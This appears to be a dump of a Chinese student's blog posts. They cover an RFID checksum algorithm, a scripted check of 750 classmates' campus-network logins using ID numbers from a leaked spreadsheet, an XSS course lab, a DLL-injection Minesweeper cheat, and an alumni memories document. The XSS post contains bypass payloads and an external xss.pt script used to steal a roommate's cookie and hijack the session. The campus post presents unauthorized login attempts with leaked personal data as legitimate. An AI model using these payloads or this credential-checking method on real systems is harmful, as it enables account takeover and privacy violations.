第一位数字</p><p>(20 - b) % 16 XOR 4 &#x3D; 第二位数字</p></blockquote><h5 id="Key6"><a href="#Key6" class="headerlink" title="Key6"></a>Key6</h5><p>映射关系</p><p><img src="http://cdn.lmark.cc/img/image-20220701133436794.png"></p><p>算法：</p><blockquote><p>a XOR 1 &#x3D; 第一位数字</p><p>（30 - b）% 16 &#x3D; 第二位数字 </p></blockquote><h4 id="算法三"><a href="#算法三" class="headerlink" title="算法三"></a>算法三</h4><p>累了，有空再写</p>]]></content>
      
      
      
        <tags>
            
            <tag> RFID </tag>
            
            <tag> M1卡 </tag>
            
            <tag> 校验位 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      
        <title>校园网安全问题</title>
      
      <link href="/archives/875c09b2.html"/>
      <url>/archives/875c09b2.html</url>
      
        <content type="html"><![CDATA[<h3 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h3><p>信息安全实在是太重要太重要。不过，在疫情时代下，公民个人隐私信息泄露已经是家常便饭了，今天，来给大家看看，通过合法手段（指在通知群里面拿到的数据），获取到的<strong>个人隐私数据</strong>，能反映出什么问题。</p><h3 id="关于校园网"><a href="#关于校园网" class="headerlink" title="关于校园网"></a>关于校园网</h3><p>校园网大伙都不陌生，有些是学校自己搭的，有些是外包给运营商来做的。今天我们故事的主人公——某某大学，有自己的校园网，但是这个校园网，有一个问题。就是校园网的默认账号是学生的学号，密码则是学生本人的身份证号后六位。乍一看，这也没什么，起码默认密码不是123456。但就是这样的设计，造成一个问题。学生会认为：别人又不知道我的身份证，所以我直接用身份证后六位这个默认密码，很安全呀！然而，正式这种想法，让许多人的校园网账号在裸奔。</p><h3 id="关于信息泄露"><a href="#关于信息泄露" class="headerlink" title="关于信息泄露"></a>关于信息泄露</h3><p>进入疫情时代以来，人们开始大规模的使用许多的线上在线文档，办公协作，还有视频会议软件。这些软件在大大方便我们生产工作的同时，也为我们埋下不小的信息安全隐患。举个最常见的例子，很多在线填写信息的excel表格，往往是多人在同一个界面填写信息，这其中有些是敏感信息，比如学号，身份证号，手机号等。如果有人别有用心，这些信息就会被他们收集起来，拿去做一些坏事。这就是说者无心，听者有心。但大多数情况下，许多的信息泄露都是发送文件的人，为了图省事，就直接把整个包含所有人的信息的excel表格直接发出去了，这也是今天这个故事的起因——用各种通知群里面发出来的文件，获取到身份证号，学号等个人信息，然后使用Python的小爬虫进行模拟登录，找出某某学院的21级新生中有多少人校园网还在用默认密码（身份证后六位）。</p><h3 id="测试回放"><a href="#测试回放" class="headerlink" title="测试回放"></a>测试回放</h3><p>首先呢，在年级的大群里，俺们辅导员曾由于失误，一不小心把整个学院（四个年级+所有研究生）本科生和研究生的个人信息（包括学号，手机号班别年级等）都给发出来了。很快地，辅导员就撤回了。但是呢，我的QQ是装有QX模块的，里面有个防撤回功能，然后我当时就点进去看了，好家伙，这是整个学院的个人信息呀，这要是被不法分子拿去倒卖，咱都得被诈骗电话给打爆呀呜呜呜。故事到这里，还没有学生们的身份证号，所以此时学生们的校园网账号还算安全，当然有了手机号也可以上TG用红鼻子社工库来查，不过信息真实性不高没有太大价值。</p><p>然后，这件事就这么过去了。很快啊，一个月过去了，准备到期末周了，某一天中午，我闲着无聊，想着，如果我用合法的手段（比如各种通知群中发出来的excel表）来获取数据，我能获取多少个人信息？想到这里，我就觉得非常兴奋，因为各种各样的群里面每天都在发着许许多多的通知，这些通知包括许多的excel表。经过我一阵地毯式搜索，我在班群里找到一个非常重磅的文件——一个有着某某学院21级新生身份证号的excel表。这个excel表本来是统计了那些尚未激活学校帮开户的银行卡的学生名单，本来这么一个文件是不应该有身份证号的，但是我猜测，这个文件是辅导员从院里面拿到，然后图方便直接发给各个班的班委，从而造成了这样一个大范围的信息泄露，只有少部分已经激活卡的人没有出现在上面。至此，登录校园网所需的账号密码都有了，接下来就是写一个爬虫自动跑一下就可以了。</p><h3 id="爬虫测试"><a href="#爬虫测试" class="headerlink" title="爬虫测试"></a>爬虫测试</h3><p>首先我自己抓了一下包，抓到了登陆请求，竟然用的是GET请求，密码是明码发送，Emmmm这就导致了这个爬虫的门槛很低。然后又抓了注销接口，然后导入了750个新生的学号和身份证号信息。接下来就是RUN了。</p><h3 id="爬虫结果"><a href="#爬虫结果" class="headerlink" title="爬虫结果"></a>爬虫结果</h3><p>结果非常非常的出乎意料，在这750名新生之中，竟然有649名大意的同学还在使用身份证后六位这个默认密码，这个真的是非常的不安全呢！！！</p><h3 id="一些话"><a href="#一些话" class="headerlink" title="一些话"></a>一些话</h3><p>很多信息泄露，都是说者无心，听者有心，很多时候都是发文件的人太懒了，都不想把敏感信息给抹除，就直接把文件下发给各班的班委，然后班委大部分时候都是单纯的转发消息，并不会抹除个人信息。能让他们不直接发出来的信息，一般都是成绩呀，排名呀，我只想说，难道这些信息能比身份证和手机号更重要？？？最后，我想说一下我的军概老师，她的信息安全意识就非常的强（因为她QQ被盗了，所以对信息安全非常敏感），想让我们每个人知道考试序号，但是又害怕把有整个班学生姓名的excel发出去会不太好，她就在上课的时候一个一个地将考试序号念给我们听。她真的好贴心呜呜呜，我哭死</p>]]></content>
      
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> 校园网 </tag>
            
            <tag> 信息安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      
        <title>网络破防实践先导实验四————XSS攻击</title>
      
      <link href="/archives/af59cd8a.html"/>
      <url>/archives/af59cd8a.html</url>
      
        <content type="html"><![CDATA[<h2 id="前情回顾"><a href="#前情回顾" class="headerlink" title="前情回顾"></a>前情回顾</h2><p>终于一路跌跌撞撞，终于来到了网络破防这门课最后一个实验，这次这个实验的可以说四个实验之中最简单的，我只花了不到一个小时就搞定了。</p><h2 id="XSS介绍"><a href="#XSS介绍" class="headerlink" title="XSS介绍"></a>XSS介绍</h2><p>首先，什么是XSS攻击呢？</p><blockquote><p>XSS攻击通常指的是通过利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。这些恶意网页程序通常是JavaScript，但实际上也可以包括Java、 VBScript、ActiveX、 Flash 或者甚至是普通的HTML。攻击成功后，攻击者可能得到包括但不限于更高的权限（如执行一些操作）、私密网页内容、会话和cookie等各种内容。                                       ——摘自百度百科</p></blockquote><p>我的理解就是，利用一些输入框，然后输入一些能产生特效果的语句，让网页执行你需要的代码，以达到攻击的目的。</p><p>网页一般用的html，如果输入的内容没有进行转义，在输出的时候有可能会变成网页html的一部分，像这种</p><h4 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a><strong>反射型XSS</strong></h4><p><img src="http://cdn.lmark.cc/img/image-20220624182159558.png"></p><p><img src="http://cdn.lmark.cc/img/image-20220624182224333.png"></p><p><img src="http://cdn.lmark.cc/img/image-20220624182239812.png"></p><p><img src="http://cdn.lmark.cc/img/image-20220624182254833.png"></p><p><img src="http://cdn.lmark.cc/img/image-20220624182314134.png"></p><p>除此之外，还有DOM Based XSS</p><h4 id="DOM-Based-XSS"><a href="#DOM-Based-XSS" class="headerlink" title="DOM Based XSS"></a>DOM Based XSS</h4><p><img src="http://cdn.lmark.cc/img/image-20220624182746968.png"></p><h4 id="XSS的过滤和绕过"><a href="#XSS的过滤和绕过" class="headerlink" title="XSS的过滤和绕过"></a>XSS的过滤和绕过</h4><p>XSS攻击是一种很常见的攻击方式，所以很早就有了各种各样的防护方式。但是道高一尺，魔高一丈，XSS攻击也有许多绕过方式，如下：</p><ul><li>闭合引号、标签</li><li>关键字过滤</li><li>编码绕过</li><li>宽字节绕过</li><li>其他技巧绕过</li></ul><p>关于每种技巧：</p><h5 id="闭合引号、标签"><a href="#闭合引号、标签" class="headerlink" title="闭合引号、标签"></a>闭合引号、标签</h5><p><img src="http://cdn.lmark.cc/img/image-20220624183639593.png"></p><h5 id="关键字过滤"><a href="#关键字过滤" class="headerlink" title="关键字过滤"></a>关键字过滤</h5><p><img src="http://cdn.lmark.cc/img/image-20220624183723311.png"></p><h5 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h5><p><img src="http://cdn.lmark.cc/img/image-20220624183805936.png"></p><p><img src="http://cdn.lmark.cc/img/image-20220624183910175.png"></p><p><img src="http://cdn.lmark.cc/img/image-20220624184134170.png"></p><h5 id="宽字节绕过"><a href="#宽字节绕过" class="headerlink" title="宽字节绕过"></a>宽字节绕过</h5><p><img src="http://cdn.lmark.cc/img/image-20220624184312204.png"></p><p><img src="http://cdn.lmark.cc/img/image-20220624184359039.png"></p><h5 id="其他绕过"><a href="#其他绕过" class="headerlink" title="其他绕过"></a>其他绕过</h5><p><img src="http://cdn.lmark.cc/img/image-20220624184445517.png"></p><p><img src="http://cdn.lmark.cc/img/image-20220624184532523.png"></p><h2 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h2><h4 id="Target-1"><a href="#Target-1" class="headerlink" title="Target 1"></a>Target 1</h4><p>Target1比较容易，直接输出即可，</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>);&lt;/script&gt;</span><br></pre></td></tr></table></figure><h4 id="Target-2"><a href="#Target-2" class="headerlink" title="Target 2"></a>Target 2</h4><p>Target2需要先把第一个a标签给结束了，才可以写自己代码，先随便输点东西看看输出的格式，</p><p><img src="http://cdn.lmark.cc/img/clip_image002.jpg"></p><p>可以看到，输出的内容是在一个a标签的herf属性中的，根据格式判断，可以构造一下payload：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&gt;&lt;img src=# onerror=alert(document.cookie) /&gt;&lt;‘</span></span><br></pre></td></tr></table></figure><p><img src="http://cdn.lmark.cc/img/clip_image004.jpg"></p><p>虽然有点不理解为什么用单引号来结束前面的双引号。</p><h4 id="Target-3"><a href="#Target-3" class="headerlink" title="Target 3"></a>Target 3</h4><p>Target3需要用到关键词过滤，script这关键词被过滤了，所以需要构造一下一个字符串来绕过检测：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;scriscriptpt&gt;<span class="title function_">alert</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>);&lt;/scriscriptpt&gt;</span><br></pre></td></tr></table></figure><h4 id="Target-4"><a href="#Target-4" class="headerlink" title="Target 4"></a>Target 4</h4><p>Target4中，一些特殊字符会被转义，所以得用不同的编码来绕过：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg&gt;<span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml">alert<span class="symbol">&amp;#40;</span>document.cookie<span class="symbol">&amp;#41;</span></span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span>&lt;svg&gt;</span><br></pre></td></tr></table></figure><h4 id="Target-5"><a href="#Target-5" class="headerlink" title="Target 5"></a>Target 5</h4><p>Target5中，提示给出的是需要利用宽字节来绕过，但是，我使用Target2的方法也能输出cookie，、</p><p><img src="http://cdn.lmark.cc/img/clip_image006.jpg"></p><p>然后，盗取别人的cookie，首先，打开xss平台，注册一个账号，然后开始一个项目，然后，复制攻击用的代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;sCRiPt sRC=<span class="comment">//xss.pt/aATU&gt;&lt;/sCrIpT&gt;</span></span><br></pre></td></tr></table></figure><p>然后发送给我亲爱滴室友，我的室友在读到信息后，我就获取到了他的cookie：</p><p> <img src="http://cdn.lmark.cc/img/clip_image008.jpg"></p><p>然后去浏览器里，检查网页，然后在应用程序中，找到cookie，进行一个修改（修改PHPSESSID和csrftoken即可）：</p><p><img src="http://cdn.lmark.cc/img/clip_image010.jpg"></p><p><img src="http://cdn.lmark.cc/img/clip_image012.jpg"></p><p>然后就可以登录这个账号了。</p><h2 id="实验心得-结课心得"><a href="#实验心得-结课心得" class="headerlink" title="实验心得 &amp;&amp; 结课心得"></a>实验心得 &amp;&amp; 结课心得</h2><p>这是最后一个实验了，网络破防到现在就全部结束了！！！这门课一开始真的挺折磨人的，各种劝退，好多人都在前两个实验就润了，留下了的人都是狼人了，和其他三个先导课（人工智能实验先导，大数据实验先导，软件工程实验先导）比起来，难度可以说挺大的，可不是跟着老师敲敲代码就能过的，得认真地学一会才能做的出来。</p><p>这门课最后的成绩可以说挺惨目忍睹的，剩了三十多个人，十几个一百分，十几个不及格，十几个中间。挂科率达到了惊人的**33.33%**，应该是四门先导课里人最少，而且挂科率还最高的课了，不得不说曲老师还是这么狠呀。</p><p>至于我嘛，差点就翻车了，四个实验少交了一个，补上之后勉强有一百了。</p><p>这个是上课的小小纪念品，不过这个寓意我是搞不懂，脑子里面有水嘛？</p><p><img src="https://cdn.lmark.cc/img/316698_origin_IMG_20220624_190528.jpg"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 网络破防实践先导 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      
        <title>网络破防实践先导实验三————用DLL注入实现扫雷外挂</title>
      
      <link href="/archives/c2bf18f6.html"/>
      <url>/archives/c2bf18f6.html</url>
      
        <content type="html"><![CDATA[<h2 id="关于这次实验"><a href="#关于这次实验" class="headerlink" title="关于这次实验"></a>关于这次实验</h2><p>在完成了前两个炒鸡炒鸡炒鸡炒鸡炒鸡炒鸡难的实验之后， 老师终于兑现了承诺——后面的实验不会太难。这个扫雷外挂实验非常滴简单，前前后后从写程序到写实验报告只花了三个小时，但是整个实验还是非常有意思的啊。</p><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>在开始做实验之前，先介绍一点前置的知识：</p><h4 id="Windows消息传递机制"><a href="#Windows消息传递机制" class="headerlink" title="Windows消息传递机制"></a>Windows消息传递机制</h4><p>简单解释一下：</p><p><img src="http://cdn.lmark.cc/img/image-20220624094403197.png"></p><p><img src="http://cdn.lmark.cc/img/image-20220624094601775.png"></p><p>消息机制也很好理解，就是Windows的应用程序，硬件，软件都会在交互的时候发送消息，一条消息里面可能包含许多信息。哎呀大概就是这个意思，<a href="http://t.zoukankan.com/jinsedemaitian-p-5589096.html">详情可以看这个</a>。</p><h4 id="DLL文件"><a href="#DLL文件" class="headerlink" title="DLL文件"></a>DLL文件</h4><blockquote><p>DLL即<strong>动态链接库</strong>（Dynamic-Link Library）的缩写，相当于Linux下的共享对象。Windows系统中大量采用DLL机制，甚至内核的结构很大程度依赖于DLL机制。Windows下的DLL文件和EXE文件实际上是一个概念，都是PE格式的<a href="https://so.csdn.net/so/search?q=%E4%BA%8C%E8%BF%9B%E5%88%B6&spm=1001.2101.3001.7020">二进制</a>文件。</p></blockquote><p>DLL属于动态链接，一般在加载时动态链接或者运行时动态链接。DLL文件可以在程序执行的任意时刻注入以完成自己的需求。</p><p><img src="http://cdn.lmark.cc/img/image-20220624100124662.png"></p><h2 id="DLL注入实现扫雷外挂"><a href="#DLL注入实现扫雷外挂" class="headerlink" title="DLL注入实现扫雷外挂"></a>DLL注入实现扫雷外挂</h2><p>首先，先配置一下环境，下载个VS，勾选必要的组件，然后新建一个DLL工程，写一个监听键盘监听的函数</p><p><img src="http://cdn.lmark.cc/img/image-20220624103028017.png"></p><p>其中FindWindowA里的两个参数就是扫雷游戏窗口名称和属性：</p><p><img src="http://cdn.lmark.cc/img/image-20220624103254868.png"></p><p>获取扫雷窗口名可以用微软官方的<strong>spyxx</strong>工具，使用起来也是很简单，打开之后，找到那个望远镜，然后再瞄准镜拖过去，就可以找到窗口的名称和属性了</p><p><img src="http://cdn.lmark.cc/img/image-20220624103648077.png"></p><p>接下来，就可以开始写DLL注入了。我们都知道，数据是存在内存中的，只要我能读取扫雷中内存存储的那一块内存，就可以知道地雷的位置，然后再配上模拟点击，就可以一键扫雷了嘎嘎嘎。</p><h4 id="分析扫雷"><a href="#分析扫雷" class="headerlink" title="分析扫雷"></a>分析扫雷</h4><p>想要扫内存，可以用经典的辅助工具 <strong>Cheat Engine</strong>，从名字就可以看出这是一个拿来作弊的工具力。经过一顿简单的操作，我很容易就找到了雷区在内存的分布。</p><p><img src="http://cdn.lmark.cc/img/image-20220624105354217.png"></p><p>经过简单的分析就可以知道：</p><blockquote><p><strong>10</strong>是雷区的边界，包裹住的范围就是可以点击的地方</p><p><strong>0F</strong>是尚未被点开的安全区</p><p><strong>8F</strong>是尚未被点开的地雷</p><p><strong>4X</strong>是被点开的地方，其中X表示周围的地雷数量</p></blockquote><p><img src="http://cdn.lmark.cc/img/image-20220624105717347.png"></p><p>可以很明显的看到地雷（8F）都埋在哪一个位置，只要遍历整个棋盘，把所有的0F处的都点一遍左键，8F处都点一遍右键，就能赢了。</p><h4 id="写扫雷程序"><a href="#写扫雷程序" class="headerlink" title="写扫雷程序"></a>写扫雷程序</h4><p>很容易可以看出，棋盘起始位置是在内存位置：0x01005361，然后再找到棋盘的长和宽数据在内存中的位置</p><p><img src="http://cdn.lmark.cc/img/image-20220624140019945.png"></p><p>然后按照刚才的思路就可以写出扫雷程序了：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">LONG OPROC;</span><br><span class="line">PBYTE w = (PBYTE)<span class="number">0x01005334</span>;</span><br><span class="line">PBYTE h = (PBYTE)<span class="number">0x01005338</span>;</span><br><span class="line">PBYTE n = (PBYTE)<span class="number">0x01005340</span>;</span><br><span class="line">PBYTE now = (PBYTE)<span class="number">0x01005361</span>;</span><br><span class="line"><span class="type">int</span> x = <span class="number">20</span>, y = <span class="number">63</span>;</span><br><span class="line"><span class="type">int</span> height, width, num;</span><br><span class="line"></span><br><span class="line"><span class="function">LRESULT CALLBACK <span class="title">WindowProc</span><span class="params">(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)</span> </span>&#123;</span><br><span class="line">    <span class="type">char</span> ssChar[<span class="number">20</span>];</span><br><span class="line">    <span class="keyword">switch</span> (uMsg) &#123;</span><br><span class="line">    <span class="keyword">case</span> WM_CHAR:</span><br><span class="line">        height = *h;</span><br><span class="line">        width = *w;</span><br><span class="line">        now = (PBYTE)<span class="number">0x01005361</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; height; j++) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; width; i++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (*now == <span class="number">15</span>) &#123;</span><br><span class="line">                    <span class="built_in">SendMessage</span>(hwnd, WM_LBUTTONDOWN, <span class="number">0</span>, <span class="built_in">MAKELPARAM</span>(x + i * <span class="number">16</span>, y+j *<span class="number">16</span>));</span><br><span class="line">                    <span class="built_in">SendMessage</span>(hwnd, WM_LBUTTONUP, <span class="number">0</span>, <span class="built_in">MAKELPARAM</span>(x + i * <span class="number">16</span>, y+j * <span class="number">16</span>));</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> (*now == <span class="number">143</span>) &#123;</span><br><span class="line">                    <span class="built_in">SendMessage</span>(hwnd, WM_RBUTTONDOWN, <span class="number">0</span>, <span class="built_in">MAKELPARAM</span>(x + i * <span class="number">16</span>, y + j * <span class="number">16</span>));</span><br><span class="line">                    <span class="built_in">SendMessage</span>(hwnd, WM_RBUTTONUP, <span class="number">0</span>, <span class="built_in">MAKELPARAM</span>(x + i * <span class="number">16</span>, y + j * <span class="number">16</span>));</span><br><span class="line">                &#125;</span><br><span class="line">                now++;</span><br><span class="line">            &#125;</span><br><span class="line">            now = (PBYTE)<span class="number">0x01005361</span> + (j<span class="number">+1</span>)*<span class="number">32</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> WM_LBUTTONDOWN:</span><br><span class="line">        <span class="comment">//MessageBoxA(nullptr, &quot;left button down&quot;, &quot;dll&quot;, MB_OK);</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">CallWindowProc</span>((WNDPROC)OPROC, hwnd, uMsg, wParam, lParam);</span><br><span class="line">&#125; </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>编译出DLL文件，用Xenos来注入</p><p><img src="http://cdn.lmark.cc/img/image-20220624140539715.png"></p><p>OK,接下来让我们来测试一下扫雷的效果：</p><p><img src="http://cdn.lmark.cc/img/b.gif"></p><h2 id="心得体会"><a href="#心得体会" class="headerlink" title="心得体会"></a>心得体会</h2><p>传统环节了，没啥骚话。这次这个实验难度终于没有这么高了，而且实验还特别有意思。嘿嘿嘿嘿，编不下去了，就这样吧。这篇文章是2022年6月24日写的，也就是期末考试结束了已经结束了，网络破防这门课页出成绩了，我到底成绩如何，敬请看下一篇文章。哈哈哈</p>]]></content>
      
      
      
        <tags>
            
            <tag> 网络破防实践先导 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      
        <title>东滨路249号的回忆</title>
      
      <link href="/archives/3abaf1c6.html"/>
      <url>/archives/3abaf1c6.html</url>
      
        <content type="html"><![CDATA[<h1 id="东滨路249号的回忆："><a href="#东滨路249号的回忆：" class="headerlink" title="东滨路249号的回忆："></a>东滨路249号的回忆：</h1><p><img src="http://cdn.lmark.cc/img/75hBvAQoPVgwR9x.png"></p><p>好好考试，想朋友，想肥家啦 </p><p>今天看见好多学校的共享文档</p><p>心想着咱浦中也要来一个⑧ 没有人弄的话就我来</p><p>人离开了浦中才懂得那段时光的美好与珍贵</p><p>所以大家就在这里分享关于浦中的回忆吧！</p><p>希望这个共享文档可以成为大家的一个心灵港湾，累了就来这里看一看，聊一聊，拒绝emo！</p><p>欢迎浦中学子激情转发！</p><p>洁己以进，反身而诚</p><h1 id="回忆录规则："><a href="#回忆录规则：" class="headerlink" title="回忆录规则："></a>回忆录规则：</h1><p>为方便阅读，每一个话题前用“**# 话题<strong>”式，同时</strong>加粗斜体14号字<strong>，想到其他的话题大家也可以自行添加；回复时，统一用</strong>12号字**，Re加内容，如：Re：回复内容；如果你想附上自己的名字，可以在Re后面加上括号，如：Re（苏总）：回复内容”</p><p>还有还有，文明用语！适度调侃！不要人身攻击！</p><p><strong>不要随意篡改别人的编辑内容！！</strong></p><p>互联网不是法外之地！</p><p>编辑的时候尽量小心一点，不要手滑了嗷</p><p>可以插入图片噢~</p><p><strong>现在文档录下了炒鸡多浦中的回忆,想方便查找的话</strong></p><p><strong>手机查看可以点击右上角的三条杠里的</strong></p><p>​                 <img src="http://cdn.lmark.cc/img/BITfr7lHotqN4hy.jpg">        </p><p><strong>“显示目录”</strong>更加方便快捷哦</p><p>​                 <img src="http://cdn.lmark.cc/img/zYBMDqauV5h9Gt3.jpg">        </p><p><strong>目录参考2021.12.27：</strong></p><p>​                 <img src="http://cdn.lmark.cc/img/qmTnLMWXSEyZa2A.png">        </p><hr><h2 id="大家现在在干什么？"><a href="#大家现在在干什么？" class="headerlink" title="# 大家现在在干什么？"></a># 大家现在在干什么？</h2><p>Re:为了明年再一次机会，体检</p><p>Re(同下):找不到刚才的，再来一次。迎着桂林的妖风跑步(╥╯^╰╥)</p><p>Re（人在天津）：刚回到柳州跟女朋友耍￣ ￣)σ</p><p>Re(人在桂林):在图书馆泡着复习工程力学和电路分析，下两周还有电工实习，害怕卵蝶</p><p>Re（丁字尺战士）:我先来！人在成都，现在在敲论文。</p><p>Re(人在民大）：正和我的小宝贝约会呢</p><p>Re (海大学牲):人在青岛，现在还在睡觉哈哈哈🥳外面太冷了</p><p>Re（为人民服务）：上海的冬天终于来了，手都要冻麻了，虽然只下了三分钟的小雪花，但在上海这个地方，能看见雪也是一件令人兴奋的事情。考试周要到了，不知道怎么复习，看着都会，但又不精。希望能顺利通过这个学期的课，下个学期就只有两门课了！</p><p>Re（焊电路的）：人在苏州，现在在写高数，高数难了</p><p>Re(码农):北京的天气把我的耳朵冻掉了!!</p><p>Re（人在苏州）:我也在苏州!!此刻正在地铁上，终点站是桑田岛，但我将会在半路下车，站点月亮湾🌙。听说外面有点飘雪（飘雨）了，冷倒是真的</p><p>Re(师大观云看石的)：人在桂林，现在早八，专业课连堂五节（星期六，呵）</p><p>Re(头秃的)：人在武汉，刚刚下了第一场雪，准备去图书馆泡一天（希望线代老师捞我，呜呜呜）</p><p>Re(秃头英专生)：人在桂林，妖风很大，每天</p><p>Re(人在桂林):好想你们啊_，宁小红，张菲菲，黄芷钰，蒙想…</p><p>Re(法学秃头狗) : 人在上海，零下不见雪。南方孩子一雪难求的卑微。</p><p>Re: （人在武汉）：好冷！3</p><p>Re：（人在柳州）：在建模！！！</p><p>Re（秃头计科生）：人在武汉，下了第一场雪呀</p><p>Re：（人在南宁）：在被窝里卷，毕竟我们宿舍已经都在图书馆卷了（同理变文，近代史好难）</p><p>Re(理科生成为文科生):人在南宁，现在疯狂背书</p><p>Re（小桃呀）：人在桂林，敲冷</p><p>Re：人在民大自习室，狂补高数只为一个奇迹</p><p>Re（人在桂林的某座山里）：和高数斗智斗勇</p><p>Re（咸鱼）:在武汉，满大街找雪嘞</p><p>Re（马原好难）：蹲在宿舍外面的走廊背马原，呜呜呜马原真的好难背</p><p>Re（小破财）:掉了好多好多头发</p><p>Re（放假大学）：人在武汉，错过了第一场雪（刚起床），现在在画图，画画不完的图</p><p>Re（长安必安）：人在西安，今天下雪9了呢，去食堂路上差点滑倒，饭后激战工图与高数 确实想欢</p><p>Re（周可儿）：在线想家，想高的伙伴们，上面的，欢说他也想你。</p><p>Re（良人）：真的喜欢高中的那段时光呀，现在是真的再也难遇到了，单纯的欢喜。</p><p>Re（人在福州）：今天要背思修，啊啊啊啊月底要考试了，还没翻开呢呜：呜呜呜呜呜救命 </p><p>Re（大学特困牲）：人在南昌，今天刮妖风走路差点7吹飞，听说明天会下雪，正在想家  9</p><p>Re（人在南宁 ) ：刚考完思修，一脸懵逼中，道德的本质是什么…………知行合一啊啊啊  啊啊啊啊啊  </p><p>Re（人在玉林）:刚刚考完美术赏，想吃浦中的云吞了。78</p><p>Re（人在福州）：狠狠羡慕考完思修的上一位同学了</p><p>Re（kk）:人在民大自习室，想回家，想朋友辣</p><p>Re(人在南宁）：昨天刚考完计算机，希望6老师能捞我一把(இдஇ; )</p><p>Re (波吉，人在长沙)：没去过什么图书馆，你要问我长沙啥样子？我不知道</p><p>Re（人在图书馆）：考研位置空了，终于有座，现在正在复习语言学纲要，现在或未来的汉教专业的学子们一起加油！</p><p>Re（一天十二小时高强度学习的期末复习狗）：想回家看看，想和朋友们见面，想睡个好觉。</p><p>Re(医学牲）：不要学医，会变得不幸！</p><p>Re (人在厦门) 厦门的冬天不太冷，不说了，大学英语是真的难</p><p>Re工大搬砖候选人，早上下了点小雪，让我这个南方人属实见了一波世面，现在在食堂吃麻辣藤椒鸡</p><p>Re（人在宿舍）复习期末，想回家：</p><p>Re（人在桂医）：论文写的我头疼</p><p>Re （放假大学+）：趴在武汉的窗边看雪。</p><p> Re（人在至善楼）  ：在背英语，这里的天气炒鸡好 ，适合学习学习学习！！！</p><p>Re（人在民大）:表示连图书馆的wifi连了好久连不上，看来是惩罚我是稀客了，孩子也想学习了，呜呜呜，让我连上刷题吧！！！</p><p>Re（人在厦门）：厦门的天气不冷，但是刚考完英语出来心拔凉拔凉的～  </p><p>Re（人在南宁）：坐在图书馆，看视频，思考自己月初是不是做错了一个决定                                        